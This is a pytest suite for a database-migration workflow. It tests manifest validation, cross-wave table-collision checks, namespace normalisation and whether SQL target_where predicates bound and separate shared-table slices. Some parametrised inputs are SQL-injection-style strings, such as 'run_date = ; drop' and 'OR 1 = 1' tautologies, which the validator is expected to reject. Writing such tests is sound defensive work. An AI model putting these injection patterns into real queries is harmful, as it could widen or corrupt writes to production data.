import ast
import asyncio
from collections import Counter
import datetime
import hashlib
import hmac
import json
import os
import re
import shlex
import subprocess
import sys
from pathlib import Path

import pytest


WORKFLOW = Path(__file__).with_name("workflow.py")


async def _stop_register_workflow(_meta):
    raise RuntimeError("stop")


def _functions():
    tree = ast.parse(WORKFLOW.read_text())
    selected = [node for node in tree.body
                if (isinstance(node, ast.FunctionDef)
                    and node.name in {"validate_manifest", "validate_verify", "ledger_violations", "declared_gates_sha",
                                      "validate_gates", "gates_approved", "check_write_targets", "other_wave_manifests",
                                      "unit_mapping", "bounded_readers", "target_key", "valid_namespace", "reads_target", "bounded_predicate",
                                      "column_key", "unit_dependencies", "transitive_writes", "check_dependencies",
                                      "mapped_target", "predicate_slices", "reader_slices", "disjoint_slices", "check_wave_tag",
                                      "check_pipelines_published", "_is_manifest"})
                or (isinstance(node, ast.Assign) and any(
                    isinstance(t, ast.Name) and t.id in {"VERIFY_DEPTHS", "GUARD_MODES", "STOP_MODES", "UNIT_ID", "WORD",
                                                         "ENV_NAME", "PARAM_VALUE", "GATE_KINDS", "GATE_STATUSES",
                                                         "DECISION_ID", "HUMAN_PROVENANCE", "DEFAULT_ACCEPTED", "_SEGMENT",
                                                         "PREDICATE_TOKEN", "PREDICATE_WORDS", "TAG_RE", "PIPELINE_RE"}
                    for t in node.targets))]
    namespace = {"Counter": Counter, "re": re, "hashlib": hashlib, "json": json, "Path": Path, "ROOT": Path("/nonexistent"), "BASE_BRANCH": "migration/estate"}
    exec(compile(ast.Module(body=selected, type_ignores=[]), str(WORKFLOW), "exec"), namespace)
    return namespace


def _batch_runtime():
    tree = ast.parse(WORKFLOW.read_text())
    selected = [node for node in tree.body
                if (isinstance(node, ast.ClassDef) and node.name == "Breaker")
                or (isinstance(node, ast.AsyncFunctionDef) and node.name == "run_batch")
                or (isinstance(node, ast.FunctionDef) and node.name in {"ledger_violations", "prompt_sha", "override_decision", "ledger_rows",
                                                                         "gate_outcomes", "ledger_waiver", "batch_max_minutes"})
                or (isinstance(node, ast.Assign) and any(
                    isinstance(t, ast.Name) and t.id in {"MERGE_EVIDENCE_MODES", "DECISION_ID", "HUMAN_PROVENANCE", "LEDGER_METADATA",
                                                         "DEFAULT_ACCEPTED", "_SEGMENT", "PREDICATE_TOKEN", "PREDICATE_WORDS"}
                    for t in node.targets))]
    namespace = {
        "asyncio": asyncio,
        "unit_eligibility": lambda head, units: {u: True for u in units},
        "evidence_in_pr": lambda head, path, units: bool(head) and any(path.startswith(f".migration/recon/{u}/") for u in units),
        "Counter": Counter,
        "hashlib": hashlib,
        "re": re,
        "decision_ledger": lambda: "",
        "MANIFEST": {"stop_c": "D-2"},
        "MAX_MINUTES": 45,
        "REPLAYED": {},
        "CHILD_SCHEMA": {},
        "REPO": ".",
        "WorkflowAgentError": RuntimeError,
        "child_prompt": lambda batch: json.dumps(batch, sort_keys=True),
        "log": lambda message: None,
        "pr_changed_paths": lambda pr_url: ("c" * 40, []),
        "replay_gate": lambda record, pr_url: (record["pr_head"], []),
    }
    exec(compile(ast.Module(body=selected, type_ignores=[]), str(WORKFLOW), "exec"), namespace)
    return namespace


def test_validate_verify_missing_and_extra_verdicts():
    validate_verify = _functions()["validate_verify"]
    passed = [{"batch": "w2-b03", "pr_url": "https://example/pr/3"}]
    missing = validate_verify({"wave_verdict": "PASS", "unit_verdicts": {},
                               "merged_prs": [], "findings": []}, passed, False)
    extra = validate_verify({"wave_verdict": "PASS", "unit_verdicts": {"w2-b03": "PASS", "other": "PASS"},
                             "merged_prs": [], "findings": []}, passed, False)
    assert "missing verdicts for w2-b03" in missing[0]
    assert any("unexpected verdicts" in problem for problem in extra)


def test_validate_verify_contradiction_and_missing_merge():
    validate_verify = _functions()["validate_verify"]
    passed = [{"batch": "w2-b03", "pr_url": "https://example/pr/3"}]
    problems = validate_verify({"wave_verdict": "PASS", "unit_verdicts": {"w2-b03": "FAIL"},
                                "merged_prs": [], "findings": []}, passed, True)
    assert any("contradict" in problem for problem in problems)
    assert any("missing https://example/pr/3" in problem for problem in problems)


@pytest.mark.parametrize("value", [0, True, "3"])
def test_validate_manifest_rejects_invalid_positive_integer(value):
    validate_manifest = _functions()["validate_manifest"]
    manifest = {"wave": 1, "repo": "repo", "child_macro": "child",
                "verify_macro": "verify", "batches": [{"id": "b", "units": ["u"],
                "write_targets": ["t"], "brief": "brief"}], "width": value,
                "base_branch": "migration/loan-servicing"}
    with pytest.raises(SystemExit, match="width"):
        validate_manifest(manifest)


@pytest.mark.parametrize("value", [0, True, "3"])
def test_validate_manifest_rejects_invalid_max_minutes(value):
    validate_manifest = _functions()["validate_manifest"]
    with pytest.raises(SystemExit, match="max_minutes"):
        validate_manifest(_manifest(max_minutes=value))
    batch_bad = _manifest()
    batch_bad["batches"][0]["max_minutes"] = value
    with pytest.raises(SystemExit, match="max_minutes"):
        validate_manifest(batch_bad)


def test_validate_manifest_accepts_a_batch_max_minutes_override():
    m = _manifest()
    m["batches"][0]["max_minutes"] = 30
    _functions()["validate_manifest"](m)


def test_validate_manifest_rejects_max_minutes_over_sixty():
    validate_manifest = _functions()["validate_manifest"]
    with pytest.raises(SystemExit, match="max_minutes.*at most 60"):
        validate_manifest(_manifest(max_minutes=61))
    m = _manifest()
    m["batches"][0]["max_minutes"] = 61
    with pytest.raises(SystemExit, match="max_minutes.*at most 60"):
        validate_manifest(m)


@pytest.mark.parametrize("bad", ["a/b", 7, {"scope": "key"}])
def test_validate_manifest_rejects_non_list_secrets(bad):
    validate_manifest = _functions()["validate_manifest"]
    with pytest.raises(SystemExit, match="secrets"):
        validate_manifest(_manifest(secrets=bad))
    m = _manifest()
    m["batches"][0]["secrets"] = bad
    with pytest.raises(SystemExit, match="secrets"):
        validate_manifest(m)


def test_validate_manifest_accepts_list_of_string_secrets():
    m = _manifest(secrets=["app/k"])
    m["batches"][0]["secrets"] = ["app/k2"]
    _functions()["validate_manifest"](m)


CAPS = {"identity": "sp-1", "catalogs": ["mig"], "ready": True, "guard_mode": "block", "stop_mode": "soft"}
HOST = "https://adb-1.azuredatabricks.net"


def _caps(**changes):
    return {**CAPS, **changes}


GATE = {"id": "g-rows", "kind": "row_parity", "status": "pending", "evidence": ""}


def _gated(batches):
    """Every manifest declares its gates at STOP C; tests about other fields get one pending gate each."""
    return [{**b, "gates": b.get("gates", [dict(GATE)])} for b in batches]


def _manifest(**extra):
    m = {"wave": 1, "repo": "repo", "child_macro": "child", "verify_macro": "verify",
         "capabilities": _caps(host=HOST),
         "base_branch": "migration/loan-servicing",
         "batches": [{"id": "b", "units": ["u"], "write_targets": ["t"], "brief": "brief"}]}
    m.update(extra)
    m["batches"] = _gated(m["batches"])
    m.setdefault("stop_c", "D-2")
    m.setdefault("gates_sha", _functions()["declared_gates_sha"](m["wave"], m["batches"]))
    return m


# ---------------------------------------------------------------- shared tables across waves (WS3.9)

B1 = {"id": "b-1", "units": ["u1"], "write_targets": ["mig.t"], "brief": "b"}
B2 = {"id": "b-2", "units": ["u2"], "write_targets": ["mig.t", "mig.other"], "brief": "b"}
SCOPE = ["run_date", "unit_id", "region", "run_id", "batch_id", "run date", "Date"]
BOUNDED = {"objects": [{"object": "mig.t", "root_table": "dbo.t", "key": ["id"], "scope_columns": SCOPE,
                        "root_where": "run_date = '${as_of}'", "target_where": "run_date = '${as_of}'"}]}
UNBOUNDED = {"objects": [{"object": "mig.t", "root_table": "dbo.t", "key": ["id"], "scope_columns": SCOPE}]}
PRIOR = {"objects": [{**BOUNDED["objects"][0], "root_where": "run_date = '${prior_as_of}'",
                      "target_where": "run_date = '${prior_as_of}'"}]}


def _others(*batches, namespace="", name="wave-1.json"):
    """The other_wave_manifests shape: each sibling wave carries its own target_namespace with its batches."""
    return {name: {"target_namespace": namespace, "batches": list(batches)}}


OTHERS = _others(B2)


def _specs(**by_unit):
    return lambda unit: by_unit.get(unit)


def test_same_wave_collision_still_halts_naming_both_batches():
    check = _functions()["check_write_targets"]
    with pytest.raises(SystemExit, match=r"collision.*'mig.t'.*b-1.*b-2"):
        check([B1, B2], {}, _specs(u1=BOUNDED, u2=PRIOR))


@pytest.mark.parametrize("spec", [UNBOUNDED,
                                  {"objects": [{**UNBOUNDED["objects"][0], "target_where": ""}]},
                                  {"objects": [{**UNBOUNDED["objects"][0], "target_where": "  "}]},
                                  {"objects": [{**UNBOUNDED["objects"][0], "target_where": 1}]}])
def test_shared_table_across_waves_needs_a_bounded_target_where(spec):
    check = _functions()["check_write_targets"]
    with pytest.raises(SystemExit, match=r"'mig.t'.*b-1.*wave-1\.json.*b-2.*u1.*target_where"):
        check([B1], _others(B2), _specs(u1=spec))


def test_shared_table_across_waves_passes_when_every_reader_is_bounded():
    check = _functions()["check_write_targets"]
    check([B1], _others(B2), _specs(u1=BOUNDED, u2=PRIOR))
    check([B1], _others({**B2, "write_targets": ["mig.other"]}), _specs())


def test_pipeline_manifests_with_overlapping_targets_halt_and_disjoint_ones_pass(tmp_path):
    fn = _functions()
    (tmp_path / "wave-p1-1.json").write_text(json.dumps({"batches": []}))
    (tmp_path / "wave-p2-1.json").write_text(json.dumps({"batches": [B2]}))
    others = fn["other_wave_manifests"](tmp_path, "wave-p1-1.json")
    assert "wave-p2-1.json" in others
    with pytest.raises(SystemExit, match=r"'mig.t'.*wave-p2-1\.json"):
        fn["check_write_targets"]([B1], others, _specs(u1=UNBOUNDED))
    (tmp_path / "wave-p2-1.json").write_text(json.dumps({"batches": [
        {**B2, "write_targets": ["mig.other"]}]}))
    others = fn["other_wave_manifests"](tmp_path, "wave-p1-1.json")
    fn["check_write_targets"]([B1], others, _specs())


def test_other_wave_manifests_skips_generated_wave_files(tmp_path):
    fn = _functions()
    (tmp_path / "wave-p1-1.json").write_text(json.dumps({"batches": [B1]}))
    (tmp_path / "wave-p1-1.merged.json").write_text(json.dumps({"base": "a" * 40, "merged": {"b-1": True}}))
    (tmp_path / "wave-p1-1.result.json").write_text(json.dumps({"wave": 1, "batches": [{"id": "b-1"}]}))
    (tmp_path / "wave-p1-1.doctor.json").write_text(json.dumps({"checks": []}))
    others = fn["other_wave_manifests"](tmp_path, "wave-p2-1.json")
    assert list(others) == ["wave-p1-1.json"]


def test_preflight_halts_until_every_declared_sibling_pipeline_has_published_a_manifest(tmp_path):
    """The collision check reads what is on disk, so a sibling whose manifest has not landed on the integration
    branch yet is invisible to it; the manifest names the pipelines the plan split, and launch waits until each
    has a manifest on origin and the disk matches origin."""
    check = _functions()["check_pipelines_published"]
    orders = json.dumps({"batches": [B1]})
    (tmp_path / "wave-orders-1.json").write_text(orders)
    manifest = {"pipelines": ["orders", "payments", "ledger"]}
    published = {"wave-orders-1.json": orders}
    with pytest.raises(SystemExit, match=r"payments, ledger.*wave-<pipeline>-<N>\.json.*integration branch"):
        check(tmp_path, manifest, published)
    payments = json.dumps({"batches": [B2]})
    (tmp_path / "wave-payments-2.json").write_text(payments)
    published["wave-payments-2.json"] = payments
    published["wave-ledger-1.result.json"] = "{}"
    with pytest.raises(SystemExit, match=r"ledger.*wave-<pipeline>-<N>\.json"):
        check(tmp_path, manifest, published)
    published["wave-ledger-1.json"] = json.dumps({"batches": []})
    with pytest.raises(SystemExit, match=r"wave-ledger-1\.json.*not on disk.*pull"):
        check(tmp_path, manifest, published)
    (tmp_path / "wave-ledger-1.json").write_text(published["wave-ledger-1.json"])
    check(tmp_path, manifest, published)
    check(tmp_path, {}, published)
    with pytest.raises(SystemExit, match="billing"):
        check(tmp_path, {"pipelines": ["orders", "billing"]}, published)


def test_preflight_halts_on_a_manifest_origin_does_not_hold_or_holds_differently(tmp_path):
    """A manifest that is only local, or edited since it was pushed, is one no sibling can see."""
    check = _functions()["check_pipelines_published"]
    (tmp_path / "wave-orders-1.json").write_text(json.dumps({"batches": [B1]}))
    with pytest.raises(SystemExit, match=r"wave-orders-1\.json.*not on origin.*commit and push"):
        check(tmp_path, {}, {})
    with pytest.raises(SystemExit, match=r"wave-orders-1\.json.*differs from origin.*commit and push"):
        check(tmp_path, {}, {"wave-orders-1.json": json.dumps({"batches": [B2]})})
    (tmp_path / "wave-orders-1.result.json").write_text("{}")
    (tmp_path / "wave-orders-1.merged.json").write_text("{}")
    check(tmp_path, {}, {"wave-orders-1.json": json.dumps({"batches": [B1]})})


@pytest.mark.parametrize("bad", ["orders", [], ["orders", "orders"], [""], ["orders/1"], [7], ["orders-1"]])
def test_validate_manifest_rejects_a_pipelines_list_that_does_not_name_distinct_pipelines(bad):
    validate = _functions()["validate_manifest"]
    with pytest.raises(SystemExit, match="'pipelines'"):
        validate({**_manifest(), "pipelines": bad})
    validate({**_manifest(), "pipelines": ["orders", "payments_2"]})


def test_check_wave_tag_pins_the_file_name_number_to_the_manifest_wave():
    check = _functions()["check_wave_tag"]
    check("1", {"wave": 1})
    check("payments-1", {"wave": 1, "pipelines": ["payments"]})
    for tag, wave in [("2", 1), ("payments-1", 2), ("payments", 1)]:
        with pytest.raises(SystemExit, match="the wave number in the file name"):
            check(tag, {"wave": wave, "pipelines": ["payments"]})


def test_check_wave_tag_requires_a_tagged_manifest_to_list_its_pipelines():
    check = _functions()["check_wave_tag"]
    with pytest.raises(SystemExit, match=r"wave-<pipeline>-<N>\.json.*pipelines"):
        check("orders-1", {"wave": 1})
    with pytest.raises(SystemExit, match="orders"):
        check("orders-1", {"wave": 1, "pipelines": ["payments", "ledger"]})


@pytest.mark.parametrize("u2", [None, {"objects": []}, {"objects": [{"object": "mig.other", "target_where": "x = 1"}]}])
def test_shared_table_other_wave_unit_without_a_mapping_for_it_halts_too(u2):
    check = _functions()["check_write_targets"]
    with pytest.raises(SystemExit, match=r"'mig.t'.*wave-1\.json.*b-2.*units/u2/mapping_spec\.json"):
        check([B1], _others(B2), _specs(u1=BOUNDED, u2=u2))


def test_shared_table_other_wave_unbounded_mapping_also_halts():
    check = _functions()["check_write_targets"]
    with pytest.raises(SystemExit, match=r"'mig.t'.*u2.*target_where"):
        check([B1], _others(B2), _specs(u1=BOUNDED, u2=UNBOUNDED))


@pytest.mark.parametrize("spec, message", [
    (None, "mapping_spec.json"),
    ({"objects": []}, "mig.t"),
    ({"objects": [{"object": "mig.other", "target_where": "x = 1"}]}, "mig.t"),
    ({"objects": "mig.t"}, "objects"),
    ([], "objects"),
])
def test_shared_table_current_unit_without_a_mapping_for_it_halts(spec, message):
    check = _functions()["check_write_targets"]
    with pytest.raises(SystemExit, match=message):
        check([B1], _others(B2), _specs(u1=spec))


def test_shared_table_matches_tables_key_and_target_table_spelling():
    check = _functions()["check_write_targets"]
    legacy = {"tables": [{"target_table": "MIG.T", "source_table": "dbo.t", "scope_columns": ["run_date"],
                          "target_where": "run_date = '${as_of}'"}]}
    check([B1], OTHERS, _specs(u1=legacy, u2=PRIOR))
    with pytest.raises(SystemExit, match="target_where"):
        check([B1], OTHERS, _specs(u1={"tables": [{"target_table": "MIG.T", "source_table": "dbo.t",
                                                  "scope_columns": ["run_date"]}]}, u2=PRIOR))


def test_shared_table_is_the_same_table_whatever_its_case_or_quoting():
    check = _functions()["check_write_targets"]
    with pytest.raises(SystemExit, match=r"collision.*b-1.*b-2"):
        check([B1, {**B2, "write_targets": ["MIG.T"]}], {}, _specs(u1=BOUNDED, u2=PRIOR))
    for other in ("MIG.T", "`mig`.`t`", " Mig.T "):
        with pytest.raises(SystemExit, match=r"'mig.t'.*b-1.*b-2.*u1.*target_where"):
            check([B1], _others({**B2, "write_targets": [other]}), _specs(u1=UNBOUNDED, u2=PRIOR))
        check([B1], _others({**B2, "write_targets": [other]}), _specs(u1=BOUNDED, u2=PRIOR))


BARE = lambda where: {"objects": [{"object": "T", "root_table": "dbo.t", "key": ["id"], "scope_columns": ["run_date"],
                                   "target_where": where}]}


@pytest.mark.parametrize("namespace", ["mig", "MIG", "`mig`", "cat.mig"])
def test_one_normalizer_qualifies_bare_names_with_the_manifest_target_namespace(namespace):
    """target_key is the one identity for manifests and mappings alike: a bare name is the table in the
    manifest's target_namespace (the catalog and schema the harness run is given), so `t`, `mig.t` and
    `cat.mig.t` are one target under `cat.mig` while `other.t` is not, in collisions and in readers."""
    fn = _functions()
    key, check = fn["target_key"], fn["check_write_targets"]
    full = "cat.mig.t" if namespace == "cat.mig" else "mig.t"
    assert key("t", namespace) == key("MIG.T", namespace) == key(full, namespace) == full
    assert key("other.t", namespace) != key("t", namespace) and key("ig.t", namespace) != key("t", namespace)
    assert fn["reads_target"]("T", "mig.t", namespace) and not fn["reads_target"]("other.t", "mig.t", namespace)
    for current, previous in (("t", "mig.t"), ("mig.t", "t"), ("T", full), (full, "t")):
        with pytest.raises(SystemExit, match=rf"'{re.escape(current)}'.*b-1.*wave-1\.json.*b-2.*u1.*target_where"):
            check([{**B1, "write_targets": [current]}], _others({**B2, "write_targets": [previous]}, namespace=namespace),
                  _specs(u1=UNBOUNDED, u2=PRIOR), namespace)
        check([{**B1, "write_targets": [current]}], _others({**B2, "write_targets": [previous]}, namespace=namespace),
              _specs(u1=BARE("run_date = '${as_of}'"), u2=PRIOR), namespace)
    with pytest.raises(SystemExit, match=r"collision.*'(t|mig\.t)'.*b-1.*b-2"):
        check([{**B1, "write_targets": ["t"]}, B2], {}, _specs(u1=BOUNDED, u2=PRIOR), namespace)
    with pytest.raises(SystemExit, match=r"'mig.t'.*u1.*target_where"):
        check([B1], _others(B2, namespace=namespace), _specs(u1=BARE(""), u2=PRIOR), namespace)
    for other in ("other.t", "ig.t"):
        with pytest.raises(SystemExit, match=r"no object reading 'mig.t'"):
            check([B1], _others(B2, namespace=namespace), _specs(u1={"objects": [{"object": other, "target_where": "id = 1"}]}, u2=PRIOR), namespace)
        check([B1], _others({**B2, "write_targets": [other]}, namespace=namespace), _specs(), namespace)


def test_each_wave_resolves_its_own_targets_with_its_own_target_namespace():
    """A bare write target means the table in the namespace of the manifest that declares it, so a sibling
    wave's targets are qualified with that wave's target_namespace, never this wave's: bare `t` under a
    sibling's `mig` is this wave's `mig.t` (shared), while bare `t` in two waves with different namespaces,
    or in a sibling with none, is two tables."""
    fn = _functions()
    check = fn["check_write_targets"]
    sibling_bare = _others({**B2, "write_targets": ["t"]}, namespace="mig")
    with pytest.raises(SystemExit, match=r"'mig.t'.*b-1.*wave-1\.json.*b-2.*u1.*target_where"):
        check([B1], sibling_bare, _specs(u1=UNBOUNDED, u2=PRIOR))
    check([B1], sibling_bare, _specs(u1=BOUNDED, u2=PRIOR))
    check([B1], sibling_bare, _specs(u1=BOUNDED, u2=BARE("run_date = '${prior_as_of}'")))
    with pytest.raises(SystemExit, match=r"'mig.t'.*wave-1\.json.*b-2.*u2.*target_where"):
        check([B1], sibling_bare, _specs(u1=BOUNDED, u2=BARE("")))
    with pytest.raises(SystemExit, match=r"no object reading 'mig.t'"):
        check([B1], sibling_bare, _specs(u1=BOUNDED, u2={"objects": [{"object": "other.t", "target_where": "id = 1"}]}))
    check([{**B1, "write_targets": ["t"]}], _others({**B2, "write_targets": ["t"]}, namespace="mig_b"), _specs(), "mig_a")
    check([{**B1, "write_targets": ["t"]}], _others({**B2, "write_targets": ["t"]}), _specs(), "mig_a")
    check([{**B1, "write_targets": ["t"]}], _others({**B2, "write_targets": ["t"]}, namespace="mig"), _specs())
    with pytest.raises(SystemExit, match=r"'t'.*b-1.*wave-1\.json.*b-2.*u1.*target_where"):
        check([{**B1, "write_targets": ["t"]}], _others({**B2, "write_targets": ["t"]}), _specs(u1=BARE(""), u2=PRIOR))
    with pytest.raises(SystemExit, match=r"'t'.*b-1.*wave-1\.json.*b-2.*u1.*target_where"):
        check([{**B1, "write_targets": ["t"]}], _others({**B2, "write_targets": ["t"]}, namespace="mig"),
              _specs(u1=BARE(""), u2=PRIOR), "MIG")
    for shape in ([B2], {"batches": [B2]}, {"target_namespace": 1, "batches": [B2]},
                  {"target_namespace": "a b", "batches": [B2]}, {"target_namespace": "", "batches": B2}):
        with pytest.raises(SystemExit, match=r"wave-1\.json"):
            check([B1], {"wave-1.json": shape}, _specs(u1=BOUNDED, u2=PRIOR))


def test_without_a_target_namespace_a_bare_mapping_object_reads_the_qualified_table_of_its_name():
    """Manifests without a target_namespace still qualify their targets while the harness's mapping objects
    are often bare (the run supplies catalog and schema). Two manifest names stay distinct (`t` is not
    `mig.t`), but a bare object with no namespace to resolve in reads the shared table whose trailing name
    it is, case-folded, so it is held to a bound rather than escaping as a non-reader."""
    fn = _functions()
    assert fn["target_key"]("T") == "t" != fn["target_key"]("mig.t") and fn["target_key"]("MIG.T") == "mig.t"
    assert fn["reads_target"]("T", "mig.t") and fn["reads_target"]("`MIG`.T", "mig.t")
    assert fn["reads_target"]("mig.t", "T") and not fn["reads_target"]("other.t", "mig.t")
    assert not fn["reads_target"]("T", "mig.t", "cat") and not fn["reads_target"]("", "t")
    check = fn["check_write_targets"]
    check([B1], _others({**B2, "write_targets": ["t"]}), _specs())
    check([{**B1, "write_targets": ["t"]}, B2], {}, _specs())
    check([B1], OTHERS, _specs(u1=BARE("run_date = '${as_of}'"), u2=PRIOR))
    with pytest.raises(SystemExit, match=r"'mig.t'.*u1.*target_where"):
        check([B1], OTHERS, _specs(u1=BARE(""), u2=PRIOR))
    with pytest.raises(SystemExit, match=r"no object reading 'mig.t'"):
        check([B1], OTHERS, _specs(u1={"objects": [{"object": "other.t", "target_where": "id = 1"}]}, u2=PRIOR))


def test_only_the_units_whose_mappings_read_a_shared_table_must_bound_it():
    """A batch of several units writes a shared table through one of them; the others' mappings never name
    it and need no bound for it. A batch none of whose units read it has no scoped reader at all: halt."""
    check = _functions()["check_write_targets"]
    other = {"objects": [{"object": "mig.other", "root_table": "dbo.o", "key": ["id"]}]}
    b1 = {**B1, "units": ["u1", "u3"]}
    check([b1], _others({**B2, "units": ["u2", "u4"]}), _specs(u1=BOUNDED, u2=PRIOR, u3=other, u4=other))
    with pytest.raises(SystemExit, match=r"'mig.t'.*b-1.*b-2.*u1.*target_where"):
        check([b1], OTHERS, _specs(u1=UNBOUNDED, u2=PRIOR, u3=other))
    with pytest.raises(SystemExit, match=r"'mig.t'.*b-1.*no unit of b-1 .*reads"):
        check([b1], OTHERS, _specs(u1=other, u2=PRIOR, u3=other))
    with pytest.raises(SystemExit, match=r"'mig.t'.*wave-1\.json.*no unit of b-2 .*reads"):
        check([b1], _others({**B2, "units": ["u2", "u4"]}), _specs(u1=BOUNDED, u2=other, u3=other, u4=other))
    with pytest.raises(SystemExit, match=r"units/u3/mapping_spec\.json is missing"):
        check([b1], OTHERS, _specs(u1=BOUNDED, u2=PRIOR))


@pytest.mark.parametrize("namespace", [1, "", " ", "a b", "cat.", ".mig", "cat..mig", ["mig"]])
def test_target_namespace_when_present_is_a_dotted_identifier(namespace):
    validate_manifest = _functions()["validate_manifest"]
    with pytest.raises(SystemExit, match="target_namespace"):
        validate_manifest({**_manifest(), "target_namespace": namespace})
    validate_manifest({**_manifest(), "target_namespace": "cat.mig"})


@pytest.mark.parametrize("where", ["1 = 1", "1=1", "'a' = 'a'", "TRUE", "NOT (1 = 2)", "${as_of} = ${as_of}",
                                   "DATE '2024-01-01' < DATE '2024-01-02'", "run_date = '${as_of}' OR 1 = 1",
                                   "1 = 1 or (run_date = '${as_of}')", "x", "run_date = ; drop",
                                   "(run_date = '${as_of}' OR 1 = 1)", "((run_date = '${as_of}') OR (1 = 1))",
                                   "(unit_id = 'u1' OR 1 = 1) AND (1 = 1)", "NOT (run_date = '${as_of}' OR 1 = 1)",
                                   "(unit_id = 'u1' AND 1 = 1) OR 1 = 1", "(run_date = '${as_of}'", "run_date = '${as_of}')",
                                   "run_date = '${as_of}' OR", "AND run_date = '${as_of}'", "() OR run_date = '${as_of}'",
                                   "unit_id = unit_id", "run_date = t.run_date", "run_date IS NOT NULL", "run_date IS NULL",
                                   "run_date <> '${as_of}'", "run_date != '${as_of}'", "NOT run_date = '${as_of}'",
                                   "NOT (run_date = '${as_of}')", "NOT deleted_at IS NULL", "run_date LIKE '%'",
                                   "run_date = '${as_of}' OR run_date IS NULL", "run_date", "run_date = ",
                                   "deleted_at = '${as_of}'", "t.other = 1 AND 1 = 1", "run_date = '${as_of}' OR other = 1"])
def test_target_where_that_does_not_pin_a_scope_column_is_not_a_bound(where):
    fn = _functions()
    spec = {"objects": [{**UNBOUNDED["objects"][0], "target_where": where}]}
    assert not fn["bounded_predicate"](where, SCOPE)
    assert fn["bounded_readers"](spec, "mig.t") == "reads it without a target_where pinning one of its scope_columns"
    with pytest.raises(SystemExit, match=r"'mig.t'.*b-1.*b-2.*u1.*target_where"):
        fn["check_write_targets"]([B1], OTHERS, _specs(u1=spec, u2=PRIOR))


@pytest.mark.parametrize("where", ["run_date = '${as_of}'", "t.run_date = DATE '2024-01-01'", "batch_id IN (1, 2)",
                                   "unit_id = 'u1' AND 1 = 1", "(region = 'eu' OR region = 'us') AND run_id = ${run}",
                                   "[run date] = 1", '"Run"."Date" = 1', "RUN_DATE = '${as_of}'", "run_date > '${as_of}'",
                                   "run_date BETWEEN '2024-01-01' AND '2024-01-31'", "run_date = '${as_of}' AND deleted_at IS NULL",
                                   "1 = 1 AND (region = 'eu' OR (region = 'us' AND 1 = 1))", "((run_date = '${as_of}'))",
                                   "unit_id = 'u1' AND (region = 'eu' OR 1 = 1)", "unit_id LIKE 'u1%'", "run_date IN ('${as_of}')"])
def test_target_where_pinning_a_declared_scope_column_is_a_bound(where):
    fn = _functions()
    spec = {"objects": [{**UNBOUNDED["objects"][0], "target_where": where}]}
    assert fn["bounded_predicate"](where, SCOPE)
    assert fn["bounded_readers"](spec, "mig.t") == ""


def _slices(where):
    return _functions()["predicate_slices"](where, SCOPE)


@pytest.mark.parametrize("a, b", [
    ("run_date = '${as_of}'", "run_date = '${prior_as_of}'"),
    ("run_date = '${as_of}'", "RUN_DATE = ${prior}"),
    ("unit_id = 'u1'", "unit_id = 'u2'"),
    ("unit_id = 'u1'", "t.UNIT_ID = 'U1'"),
    ("batch_id IN (1, 2)", "batch_id IN (3, 4)"),
    ("batch_id = 1", "batch_id IN (2, 3)"),
    ("run_date < '2024-02-01'", "run_date >= '2024-02-01'"),
    ("run_date BETWEEN '2024-01-01' AND '2024-01-31'", "run_date BETWEEN '2024-02-01' AND '2024-02-29'"),
    ("run_date BETWEEN DATE '2024-01-01' AND DATE '2024-01-31'", "run_date > DATE '2024-01-31'"),
    ("batch_id <= 10", "11 <= batch_id"),
    ("batch_id > 10", "batch_id = 10"),
    ("unit_id = 'u1' AND run_date = '${as_of}'", "unit_id = 'u2' AND run_date = '${as_of}'"),
    ("unit_id = 'u1' AND run_date = '${as_of}'", "unit_id = 'u1' AND run_date = '${prior}'"),
    ("region = 'eu' OR region = 'us'", "region = 'apac' OR region = 'latam'"),
    ("(region = 'eu' AND run_id = 1) OR region = 'us'", "region = 'apac'"),
    ("1 = 1 AND unit_id = 'u1'", "unit_id = 'u2' AND deleted_at IS NULL"),
])
def test_slices_of_two_readers_are_disjoint_when_the_predicates_prove_it(a, b):
    """Two readers of a shared table may each recon their own slice only when the predicates cannot select
    the same row: equality or IN on a scope column with no value in common, non-overlapping literal ranges,
    or a pin on differently named parameters (each run supplies its own; the same name is the same value).
    An AND is separated by any one column, an OR only when every branch is."""
    fn = _functions()
    assert fn["disjoint_slices"](_slices(a), _slices(b)) and fn["disjoint_slices"](_slices(b), _slices(a))
    check = fn["check_write_targets"]
    check([B1], OTHERS, _specs(u1={"objects": [{**UNBOUNDED["objects"][0], "target_where": a}]},
                               u2={"objects": [{**UNBOUNDED["objects"][0], "target_where": b}]}))


@pytest.mark.parametrize("a, b", [
    ("run_date = '${as_of}'", "run_date = '${as_of}'"),
    ("run_date = '${as_of}'", "RUN_DATE = ${as_of}"),
    ("run_date = '${as_of}'", "run_date = '2024-01-01'"),
    ("run_date = '${as_of}'", "unit_id = 'u1'"),
    ("unit_id = 'u1'", "unit_id = 'u1'"),
    ("unit_id = 'u1'", "unit_id IN ('u1', 'u2')"),
    ("unit_id LIKE 'u1%'", "unit_id LIKE 'u2%'"),
    ("unit_id LIKE 'u1%'", "unit_id = 'u2'"),
    ("run_date < '2024-02-01'", "run_date > '2024-01-15'"),
    ("run_date <= '2024-02-01'", "run_date >= '2024-02-01'"),
    ("run_date BETWEEN '2024-01-01' AND '2024-02-15'", "run_date BETWEEN '2024-02-01' AND '2024-02-29'"),
    ("batch_id < 10", "batch_id < 20"),
    ("batch_id > 10", "batch_id = 11"),
    ("batch_id > ${lo}", "batch_id < ${hi}"),
    ("batch_id > 10", "batch_id < '20'"),
    ("unit_id = 'u1' AND run_date = '${as_of}'", "unit_id = 'u1' AND run_date = '${as_of}'"),
    ("region = 'eu' OR region = 'us'", "region = 'us' OR region = 'apac'"),
    ("(region = 'eu' AND run_id = 1) OR region = 'us'", "region = 'us' AND run_id = 2"),
    ("region = 'eu' OR unit_id = 'u1'", "region = 'us'"),
])
def test_shared_table_readers_whose_slices_may_overlap_halt_naming_both_units(a, b):
    """Overlap, or scopes the workflow cannot prove apart (a parameter against a literal, LIKE prefixes,
    pins on different columns, ranges the same value satisfies), halts before launch naming the table and
    both readers, whichever wave each is in."""
    fn = _functions()
    assert not fn["disjoint_slices"](_slices(a), _slices(b))
    check = fn["check_write_targets"]
    u1 = {"objects": [{**UNBOUNDED["objects"][0], "target_where": a}]}
    u2 = {"objects": [{**UNBOUNDED["objects"][0], "target_where": b}]}
    with pytest.raises(SystemExit, match=r"'mig.t'.*u1 .*u2 \(wave-1\.json b-2\).*overlap"):
        check([B1], OTHERS, _specs(u1=u1, u2=u2))
    with pytest.raises(SystemExit, match=r"'mig.t'.*overlap"):
        check([{**B1, "units": ["u1", "u3"]}], _others({**B2, "units": ["u2"]}), _specs(u1=u1, u3=u2, u2=PRIOR))


